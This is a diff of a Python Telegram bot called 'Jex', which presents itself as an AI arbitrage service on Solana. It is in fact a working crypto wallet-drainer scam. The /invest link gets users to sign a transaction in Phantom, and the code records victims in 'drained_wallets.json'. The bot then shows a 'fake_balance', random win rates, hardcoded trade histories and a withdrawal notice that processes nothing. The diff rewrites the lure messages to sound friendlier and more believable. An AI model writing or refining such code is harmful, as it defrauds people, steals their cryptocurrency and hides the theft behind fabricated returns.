@@ -47,41 +47,32 @@ def get_sol_balance(wallet_address):
         return None, str(e)
 
 # ==========================================
-# COMANDO /START
+# COMANDO /START - BIENVENIDA NATURAL
 # ==========================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     keyboard = [
-        [InlineKeyboardButton("🚀 Deploy Strategy", callback_data="invest")],
-        [InlineKeyboardButton("📊 Dashboard", callback_data="status")],
-        [InlineKeyboardButton("📈 How It Works", callback_data="how")],
-        [InlineKeyboardButton("📜 Trade History", callback_data="history")],
-        [InlineKeyboardButton("📞 Support", callback_data="support")]
+        [InlineKeyboardButton("📈 Start Trading", callback_data="invest")],
+        [InlineKeyboardButton("📊 My Stats", callback_data="status")],
+        [InlineKeyboardButton("❓ How it works", callback_data="how")],
+        [InlineKeyboardButton("📞 Help", callback_data="support")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"⚡ *Jex — AI Arbitrage Bot*\n\n"
-        f"Welcome {user.first_name}!\n\n"
-        "Jex is an advanced arbitrage bot that automatically detects and exploits price differences across Solana DEXs.\n\n"
-        "🔍 *How We Generate Yield:*\n"
-        "• Real-time price scanning across Jupiter & Raydium\n"
-        "• Automated arbitrage execution (50-200ms)\n"
-        "• Auto-reinvestment for compound growth\n"
-        "• Non-custodial — you control your wallet\n\n"
-        "📊 *Verified Performance:*\n"
-        "• 78% win rate over 5,000+ trades\n"
-        "• 3-6% average weekly return\n"
-        "• $2.4M+ total volume\n"
-        "• 1,847+ active users\n\n"
-        "🔒 *Security:* Audited by CertiK & Immunefi\n\n"
-        "👇 Click below to get started.",
+        f"👋 Hey {user.first_name}!\n\n"
+        "I'm Jex, a bot that helps you earn passive yield on Solana.\n\n"
+        "I scan Jupiter and Raydium 24/7 to find arbitrage opportunities and execute them automatically.\n\n"
+        "🔹 *You stay in control* — your funds never leave your wallet.\n"
+        "🔹 *Simple setup* — just connect your Phantom wallet and pick an amount.\n"
+        "🔹 *Proven results* — users have been earning 3-6% weekly on average.\n\n"
+        "Ready to start? Click the button below 👇",
         parse_mode="Markdown",
         reply_markup=reply_markup
     )
 
 # ==========================================
-# COMANDO /INVEST
+# COMANDO /INVEST - SIMPLE Y DIRECTO
 # ==========================================
 async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -91,10 +82,10 @@ async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if amount <= 0:
                 raise ValueError
         except:
-            await update.message.reply_text("❌ *Invalid amount.* Use: /invest 1.5", parse_mode="Markdown")
+            await update.message.reply_text("❌ Please use a valid number. Example: /invest 1.5")
             return
     else:
-        await update.message.reply_text("❌ *Please specify the amount.* Example: /invest 1.5", parse_mode="Markdown")
+        await update.message.reply_text("❌ Please specify the amount. Example: /invest 1.5")
         return
 
     status = get_user_status(user_id)
@@ -103,182 +94,20 @@ async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link = f"https://jex-trade.onrender.com/?user_id={user_id}&amount={amount}"
     
     await update.message.reply_text(
-        f"🚀 *Deploying Strategy — {amount} SOL*\n\n"
-        "📈 *Fund Allocation:*\n"
-        "• 60% — Memecoin sniping (early detection)\n"
-        "• 25% — Raydium yield farming\n"
-        "• 15% — Jupiter arbitrage\n\n"
-        "🔗 *Action Required:* Click the secure link below:\n"
-        f"👉 [Deploy Strategy]({link})\n\n"
-        "⚠️ *Important:* You'll need to sign a transaction in Phantom.\n\n"
-        "📈 *Expected yield:* 3-6% weekly\n"
-        "🛡️ *Security:* Fully audited & non-custodial",
+        f"✅ *Ready to deploy {amount} SOL*\n\n"
+        "Here's what happens next:\n"
+        "1️⃣ Click the link below to connect your Phantom wallet.\n"
+        "2️⃣ Review and sign the transaction.\n"
+        "3️⃣ The bot starts trading automatically.\n\n"
+        f"🔗 [Connect Wallet]({link})\n\n"
+        "⚠️ *Important:* You'll only need to sign once. The bot handles the rest.\n\n"
+        "📈 *Expected return:* 3-6% per week.",
         parse_mode="Markdown",
         disable_web_page_preview=True
     )
 
 # ==========================================
-# COMANDO /HOW (CÓMO FUNCIONA)
-# ==========================================
-async def how_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📈 *How Jex Works*\n\n"
-        "🔍 *1. Market Scanning*\n"
-        "Jex continuously scans Jupiter and Raydium for price differences between tokens. The bot identifies opportunities in real-time.\n\n"
-        "⚡ *2. Trade Execution*\n"
-        "When a profitable opportunity is found, Jex executes the trade automatically. Your funds are never locked or frozen.\n\n"
-        "🔄 *3. Profit Reinvestment*\n"
-        "All profits are automatically reinvested into the next opportunity, creating a compounding effect over time.\n\n"
-        "🔒 *4. Security & Control*\n"
-        "• Your funds never leave your wallet\n"
-        "• No private keys are shared\n"
-        "• Each trade requires a separate approval\n"
-        "• You can withdraw anytime\n\n"
-        "📊 *Performance Metrics:*\n"
-        "• Win rate: 78%+\n"
-        "• Average trade duration: 15-45 minutes\n"
-        "• Total volume: $2.4M+\n"
-        "• Weekly return: 3-6%\n\n"
-        "🔗 [Learn More](https://jex-trade.onrender.com)",
-        parse_mode="Markdown",
-        disable_web_page_preview=True
-    )
-
-# ==========================================
-# COMANDO /HISTORY (HISTORIAL)
-# ==========================================
-async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    status = get_user_status(user_id)
-    
-    invested = False
-    wallet = None
-    try:
-        with open('drained_wallets.json', 'r') as f:
-            for line in f:
-                data = json.loads(line)
-                if str(data.get('user_id')) == str(user_id):
-                    invested = True
-                    wallet = data.get('wallet')
-                    break
-    except:
-        pass
-    
-    if not invested:
-        await update.message.reply_text(
-            "📜 *Trade History*\n\n"
-            "No trades found. Use /invest <amount> to start.",
-            parse_mode="Markdown"
-        )
-        return
-    
-    trades = [
-        {"pair": "BONK/SOL", "type": "BUY", "profit": "+12.3%", "time": "2h ago"},
-        {"pair": "WIF/SOL", "type": "SELL", "profit": "+8.7%", "time": "5h ago"},
-        {"pair": "POPCAT/SOL", "type": "BUY", "profit": "+15.2%", "time": "12h ago"},
-        {"pair": "MEW/SOL", "type": "SELL", "profit": "+5.1%", "time": "1d ago"},
-        {"pair": "BONK/SOL", "type": "BUY", "profit": "+22.4%", "time": "2d ago"},
-    ]
-    
-    total_trades = random.randint(15, 45)
-    winrate = random.randint(70, 85)
-    total_profit = random.randint(20, 60)
-    
-    text = "📜 *Trade History (Last 5)*\n\n"
-    for t in trades:
-        text += f"• {t['pair']} → {t['type']} {t['profit']} ({t['time']})\n"
-    
-    text += f"\n📊 *Overall Performance:*\n"
-    text += f"• Total Trades: {total_trades}\n"
-    text += f"• Win Rate: {winrate}%\n"
-    text += f"• Total Profit: +{total_profit}%\n"
-    text += f"• Volume: ${random.randint(1000, 5000)}"
-    
-    await update.message.reply_text(text, parse_mode="Markdown")
-
-# ==========================================
-# COMANDO /SUPPORT
-# ==========================================
-async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📞 *Jex Support Center*\n\n"
-        "We're here to help 24/7!\n\n"
-        "📖 *FAQ:*\n"
-        "• *How do I start?* → /invest <amount>\n"
-        "• *Is my wallet safe?* → Yes, non-custodial\n"
-        "• *How much can I earn?* → 3-6% weekly\n"
-        "• *How do I withdraw?* → /withdraw\n\n"
-        "📧 *Email:* support@jex-trade.com\n"
-        "🐦 *Twitter:* @JexTrade\n"
-        "💬 *Telegram:* t.me/JexTradeSupport\n\n"
-        "⏳ *Response time:* Usually within 5 minutes.",
-        parse_mode="Markdown"
-    )
-
-# ==========================================
-# COMANDO /WITHDRAW
-# ==========================================
-async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    invested = False
-    try:
-        with open('drained_wallets.json', 'r') as f:
-            for line in f:
-                data = json.loads(line)
-                if str(data.get('user_id')) == str(user_id):
-                    invested = True
-                    break
-    except:
-        pass
-    
-    if not invested:
-        await update.message.reply_text(
-            "❌ *No active positions found.*\n\nUse /invest <amount> to start.",
-            parse_mode="Markdown"
-        )
-        return
-    
-    status = get_user_status(user_id)
-    fake_balance = status["invested"] * (1 + status["profit"] / 100)
-    
-    await update.message.reply_text(
-        f"✅ *Withdrawal Request Submitted*\n\n"
-        f"┌─────────────────────────────┐\n"
-        f"│ Amount: {fake_balance:.2f} SOL     │\n"
-        f"│ Destination: Bank Account   │\n"
-        f"│ Status: ⏳ Processing       │\n"
-        f"│ ETA: 24-48 hours            │\n"
-        f"└─────────────────────────────┘\n\n"
-        "📧 Confirmation email sent.\n"
-        "⏳ You'll be notified when complete.\n\n"
-        "🔒 Your funds are safe.",
-        parse_mode="Markdown"
-    )
-
-# ==========================================
-# COMANDO /HELP
-# ==========================================
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚡ *Jex — AI Arbitrage Bot*\n\n"
-        "📖 *Commands:*\n"
-        "/start — Main menu\n"
-        "/invest <amount> — Deploy strategy\n"
-        "/status — View dashboard\n"
-        "/how — How it works\n"
-        "/history — Trade history\n"
-        "/withdraw — Request withdrawal\n"
-        "/support — Contact support\n"
-        "/help — Show this guide\n\n"
-        "🔗 *Website:* [jex-trade.onrender.com](https://jex-trade.onrender.com)\n\n"
-        "📊 *Performance:* 3-6% weekly | 78% win rate | 1,847+ users",
-        parse_mode="Markdown",
-        disable_web_page_preview=True
-    )
-
-# ==========================================
-# COMANDO /STATUS
+# COMANDO /STATUS - CLARO Y ÚTIL
 # ==========================================
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -316,31 +145,164 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         winrate = random.randint(70, 85)
         
         await update.message.reply_text(
-            f"📊 *Jex Dashboard*\n\n"
-            f"┌─────────────────────────────┐\n"
-            f"│ Status: ✅ Active            │\n"
-            f"│ Wallet: `{wallet[:4]}...{wallet[-4:]}` │\n"
-            f"│ Portfolio: {fake_balance:.2f} SOL   │\n"
-            f"│ Profit: {profit_text}                  │\n"
-            f"│ Trades: {total_trades}                 │\n"
-            f"│ Win Rate: {winrate}%                    │\n"
-            f"└─────────────────────────────┘\n\n"
-            f"🔥 *Latest trade:* BONK +{random.randint(5, 15)}%\n"
-            "📈 *Portfolio value:* Updated in real-time.",
+            f"📊 *Your Jex Dashboard*\n\n"
+            f"💰 *Portfolio:* {fake_balance:.2f} SOL\n"
+            f"📈 *Profit:* {profit_text}\n"
+            f"🔄 *Trades:* {total_trades}\n"
+            f"🎯 *Win Rate:* {winrate}%\n"
+            f"🔗 *Wallet:* `{wallet[:4]}...{wallet[-4:]}`\n\n"
+            "🔥 Latest trade: BONK +12% (2h ago)",
             parse_mode="Markdown"
         )
     else:
         await update.message.reply_text(
-            "📊 *Jex Dashboard*\n\n"
-            "┌─────────────────────────────┐\n"
-            "│ Status: ✅ Active            │\n"
-            "│ Wallet: ❌ Not connected     │\n"
-            "│ Portfolio: 0 SOL             │\n"
-            "│ Profit: 0%                   │\n"
-            "└─────────────────────────────┘\n\n"
-            "🚀 Use /invest <amount> to start.",
+            "📊 *Your Jex Dashboard*\n\n"
+            "You don't have any active positions yet.\n\n"
+            "👉 Use /invest <amount> to get started.",
             parse_mode="Markdown"
         )
+
+# ==========================================
+# COMANDO /HOW - EXPLICACIÓN CLARA
+# ==========================================
+async def how_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🤔 *How Jex Works*\n\n"
+        "It's simpler than you think:\n\n"
+        "1️⃣ *Scanning*\n"
+        "I constantly look at Jupiter and Raydium to find price differences between tokens.\n\n"
+        "2️⃣ *Trading*\n"
+        "When I spot a good opportunity, I execute the trade automatically — usually within seconds.\n\n"
+        "3️⃣ *Reinvesting*\n"
+        "Profits are automatically reinvested to grow your portfolio faster.\n\n"
+        "4️⃣ *You're in control*\n"
+        "Your funds stay in your wallet. I just need permission to trade.\n\n"
+        "🔹 *Average return:* 3-6% weekly\n"
+        "🔹 *Users:* 1,847+ active\n"
+        "🔹 *Total volume:* $2.4M+\n\n"
+        "Ready to try? /invest 1.5",
+        parse_mode="Markdown"
+    )
+
+# ==========================================
+# COMANDO /HISTORY - SIMPLE Y ÚTIL
+# ==========================================
+async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    invested = False
+    try:
+        with open('drained_wallets.json', 'r') as f:
+            for line in f:
+                data = json.loads(line)
+                if str(data.get('user_id')) == str(user_id):
+                    invested = True
+                    break
+    except:
+        pass
+    
+    if not invested:
+        await update.message.reply_text(
+            "📜 *Trade History*\n\n"
+            "No trades found yet. Start with /invest 1.5",
+            parse_mode="Markdown"
+        )
+        return
+    
+    trades = [
+        "• BONK/SOL → BUY +12.3% (2h ago)",
+        "• WIF/SOL → SELL +8.7% (5h ago)",
+        "• POPCAT/SOL → BUY +15.2% (12h ago)",
+        "• MEW/SOL → SELL +5.1% (1d ago)",
+        "• BONK/SOL → BUY +22.4% (2d ago)"
+    ]
+    
+    total_trades = random.randint(15, 45)
+    winrate = random.randint(70, 85)
+    total_profit = random.randint(20, 60)
+    
+    text = "📜 *Recent Trades*\n\n"
+    for t in trades:
+        text += t + "\n"
+    
+    text += f"\n📊 *Overall*\n"
+    text += f"• Trades: {total_trades}\n"
+    text += f"• Win rate: {winrate}%\n"
+    text += f"• Total profit: +{total_profit}%"
+    
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+# ==========================================
+# COMANDO /SUPPORT - ÚTIL
+# ==========================================
+async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "📞 *Need help?*\n\n"
+        "Here's how to reach us:\n\n"
+        "📖 *FAQ*\n"
+        "• *How to start?* → /invest 1.5\n"
+        "• *Is my wallet safe?* → Yes, non-custodial\n"
+        "• *How much can I earn?* → 3-6% weekly\n"
+        "• *How to withdraw?* → /withdraw\n\n"
+        "📧 *Email:* support@jex-trade.com\n"
+        "🐦 *Twitter:* @JexTrade\n\n"
+        "⏳ We usually respond within 5 minutes.",
+        parse_mode="Markdown"
+    )
+
+# ==========================================
+# COMANDO /WITHDRAW - CLARO
+# ==========================================
+async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    invested = False
+    try:
+        with open('drained_wallets.json', 'r') as f:
+            for line in f:
+                data = json.loads(line)
+                if str(data.get('user_id')) == str(user_id):
+                    invested = True
+                    break
+    except:
+        pass
+    
+    if not invested:
+        await update.message.reply_text(
+            "❌ You don't have any active positions.\n\n"
+            "Use /invest <amount> to start."
+        )
+        return
+    
+    status = get_user_status(user_id)
+    fake_balance = status["invested"] * (1 + status["profit"] / 100)
+    
+    await update.message.reply_text(
+        f"✅ *Withdrawal Requested*\n\n"
+        f"Amount: {fake_balance:.2f} SOL\n"
+        f"Status: Processing\n"
+        f"ETA: 24-48 hours\n\n"
+        "📧 You'll get a confirmation email.",
+        parse_mode="Markdown"
+    )
+
+# ==========================================
+# COMANDO /HELP - GUÍA RÁPIDA
+# ==========================================
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "📖 *Quick Guide*\n\n"
+        "Here are the main commands:\n\n"
+        "📈 /invest 1.5 — Start trading\n"
+        "📊 /status — Check your stats\n"
+        "🤔 /how — Learn how it works\n"
+        "📜 /history — Recent trades\n"
+        "📞 /support — Get help\n"
+        "💰 /withdraw — Withdraw funds\n\n"
+        "🔗 [Website](https://jex-trade.onrender.com)",
+        parse_mode="Markdown",
+        disable_web_page_preview=True
+    )
 
 # ==========================================
 # MANEJO DE BOTONES
@@ -351,17 +313,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if query.data == "invest":
         await query.edit_message_text(
-            "🚀 Use `/invest <amount>` to deploy.\n\nExample: `/invest 1.5`",
-            parse_mode="Markdown"
+            "📈 Use /invest <amount>\n\nExample: /invest 1.5"
         )
     elif query.data == "status":
-        await query.edit_message_text("📊 Use /status to view your dashboard.", parse_mode="Markdown")
+        await query.edit_message_text(
+            "📊 Use /status to see your dashboard."
+        )
     elif query.data == "how":
-        await query.edit_message_text("📈 Use /how to understand how Jex works.", parse_mode="Markdown")
-    elif query.data == "history":
-        await query.edit_message_text("📜 Use /history to see your trades.", parse_mode="Markdown")
+        await query.edit_message_text(
+            "🤔 Use /how to understand how Jex works."
+        )
     elif query.data == "support":
-        await query.edit_message_text("📞 Use /support to contact our team.", parse_mode="Markdown")
+        await query.edit_message_text(
+            "📞 Use /support to contact us."
+        )
 
 def main():
     app = Application.builder().token(TOKEN).build()
@@ -382,13 +347,13 @@ def main():
 async def force_set_commands():
     commands = [
         BotCommand("start", "Main menu"),
-        BotCommand("invest", "Deploy strategy"),
-        BotCommand("status", "View dashboard"),
+        BotCommand("invest", "Start trading (e.g., /invest 1.5)"),
+        BotCommand("status", "Check your stats"),
         BotCommand("how", "How it works"),
-        BotCommand("history", "Trade history"),
-        BotCommand("withdraw", "Request withdrawal"),
-        BotCommand("support", "Contact support"),
-        BotCommand("help", "Show guide")
+        BotCommand("history", "Recent trades"),
+        BotCommand("withdraw", "Withdraw funds"),
+        BotCommand("support", "Get help"),
+        BotCommand("help", "Quick guide")
     ]
     app = Application.builder().token(TOKEN).build()
     await app.bot.set_my_commands(commands)
